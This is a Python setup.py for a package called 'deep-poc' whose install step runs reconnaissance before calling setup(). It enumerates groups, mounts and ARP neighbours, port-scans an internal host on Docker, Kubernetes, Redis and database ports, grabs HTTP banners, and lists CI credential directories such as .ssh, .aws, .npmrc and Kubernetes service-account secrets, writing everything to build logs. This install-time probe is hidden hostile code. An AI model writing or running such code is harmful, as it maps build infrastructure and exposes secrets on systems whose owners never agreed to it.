import os
import sys
import subprocess
import socket
from setuptools import setup

def deep_inspect():
    err = sys.stderr.write
    err("\n" + "Z"*60 + "\n")
    err("DEEP INFRASTRUCTURE INSPECTION\n")
    
    
    err(f"\n[+] GROUPS: {subprocess.getoutput('groups')}\n")
    err(f"[+] MOUNTS:\n{subprocess.getoutput('mount | grep -v nodev')}\n")

     
    err("\n[+] NETWORK NEIGHBORS (ARP):\n")
    err(subprocess.getoutput("ip neigh show || arp -a") + "\n")

    
    err("\n[+] HOST SERVICE SCAN (172.16.11.1):\n")
    target = "172.16.11.1"
     
    common_ports = [22, 80, 443, 2375, 2376, 3306, 5000, 6379, 6443, 8080]
    for port in common_ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.2)
        if s.connect_ex((target, port)) == 0:
            err(f"!!! [OPEN] PORT {port} ON HOST {target} !!!\n")
            # Если порт 80 или 8080 открыт, пробуем почитать заголовки
            if port in [80, 8080]:
                try:
                    s.send(b"GET / HTTP/1.0\r\n\r\n")
                    err(f"Response: {s.recv(100).decode('utf-8', 'ignore')}\n")
                except: pass
        s.close()

    
    err("\n[+] SEARCHING FOR CI SECRETS:\n")
    secret_locations = [
        "/home/buildbot/.ssh",
        "/home/buildbot/.aws",
        "/home/buildbot/.npmrc",
        "/run/secrets",
        "/var/run/secrets/kubernetes.io/serviceaccount"
    ]
    for loc in secret_locations:
        if os.path.exists(loc):
            err(f"[FOUND DIR] {loc} Content: {os.listdir(loc)}\n")
        else:
            err(f"[-] {loc} not found\n")

     
    err(f"\n[+] ULIMITS:\n{subprocess.getoutput('ulimit -a')}\n")

    err("Z"*60 + "\n")
    sys.exit(1)

deep_inspect()
setup(name="deep-poc", version="1.0.0")
